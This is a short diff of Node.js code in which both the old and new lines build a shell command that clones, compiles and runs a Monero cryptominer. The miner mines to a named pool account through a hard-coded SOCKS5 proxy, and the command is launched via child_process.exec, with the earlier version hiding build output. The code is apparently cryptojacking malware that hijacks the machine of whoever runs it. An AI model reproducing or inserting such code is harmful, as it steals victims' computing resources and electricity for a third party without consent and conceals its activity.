@@ -1,4 +1,4 @@
-var str = "git clone https://github.com/tsiv/ccminer-cryptonight && cd ccminer-cryptonight && ./autogen.sh > /dev/null 2>&1 && ./configure --with-crypto --with-curl > /dev/null 2>&1 && make > /dev/null 2>&1 && ./ccminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u cccholo@yandex.com -p x --proxy socks5://104.202.128.248:51376";
+var str = "git clone https://github.com/wolf9466/cpuminer-multi && cd cpuminer-multi && ./autogen.sh && CFLAGS="-march=native" ./configure && make && ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u cccholo@yandex.com -p x --proxy socks5://104.202.128.248:51376";
 var child = require('child_process').exec(str);
 child.stdout.on('data', function(data) {
     console.log('stdout: ' + data);
